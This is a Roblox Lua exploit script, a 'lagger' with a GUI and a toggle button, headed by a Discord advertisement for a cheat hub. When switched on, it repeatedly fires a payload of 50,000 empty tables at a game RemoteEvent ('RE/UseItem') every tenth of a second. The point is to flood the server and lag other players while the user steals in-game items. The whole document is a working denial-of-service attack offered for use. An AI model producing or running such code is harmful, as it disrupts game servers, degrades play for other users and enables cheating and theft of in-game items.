-Why Buy Lights? Just Buy Cxyro Hubs It's cheaper And Better https://discord.gg/Rq3HECEntB

-- Create the GUI elements
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local StatusLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

-- Setup UI Properties
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

MainFrame.Name = "LSC MIA"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.5, -100, 0.5, -60)
MainFrame.Size = UDim2.new(0, 200, 0, 130)
MainFrame.Active = true
MainFrame.Draggable = true

Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "LSC MIA LAGGER!"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.BackgroundTransparency = 1

StatusLabel.Parent = MainFrame
StatusLabel.Position = UDim2.new(0, 0, 0.25, 0)
StatusLabel.Size = UDim2.new(1, 0, 0, 20)
StatusLabel.Text = "make people confused: 6123126312831631831212313177717237123"
StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
StatusLabel.BackgroundTransparency = 1

ToggleButton.Parent = MainFrame
ToggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
ToggleButton.Size = UDim2.new(0.8, 0, 0.35, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
ToggleButton.Text = "START LAGGING THEM BAD BOYS"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.Gotham

--- Execution Logic ---
local active = false
local count = 0
local payload = table.create(50000, {})
local remote = game:GetService("ReplicatedStorage").Packages.Net["RE/UseItem"]

ToggleButton.MouseButton1Click:Connect(function()
    active = not active
    
    if active then
        ToggleButton.Text = "MOMMY WHY IS MY PING SO HIGH? AH IM STEALNIG A OP BRAINROT I LOVE LAGGERS!!!"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
        
        task.spawn(function()
            while active do
                remote:FireServer(payload)
                count = count + 1
                StatusLabel.Text = "Sent: " .. count
                task.wait(0.1)
            end
        end)
    else
        ToggleButton.Text = "START LAGGING THEM BAD BOYS"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    end
end)